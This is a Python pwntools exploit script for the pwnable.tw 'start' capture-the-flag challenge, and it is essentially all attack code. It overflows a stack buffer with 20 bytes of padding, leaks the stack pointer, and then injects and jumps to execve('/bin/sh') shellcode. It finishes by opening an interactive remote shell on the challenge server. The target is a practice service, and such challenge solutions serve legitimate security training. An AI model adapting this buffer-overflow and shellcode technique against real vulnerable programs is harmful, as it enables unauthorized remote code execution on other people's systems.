from pwn import *

def exploit(c):
    buf = ""
    # [*] found at offset: 20 (initial at 5000)
    buf += "A"*20
    #buf += p32(0x42424242)
    buf += p32(0x8048087)
    #8048087
    #buf += "C"*(5000-20-4)
    print c.recvuntil("CTF:")
    c.send(buf)
    esp_address=u32(c.recv()[0:4])
    print "leaked ESP address is : %s " %(hex(esp_address))
    #pause()
    buf = ""
    buf += "A"*20
    print "raw is : " + p32(esp_address)
    buf += p32(esp_address+20)
    shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    buf += asm('xor edx, edx')
    buf += shellcode
    c.send(buf)
    c.interactive()

#c = process('./start')
#pause()
c = remote('chall.pwnable.tw',10000)
exploit(c)
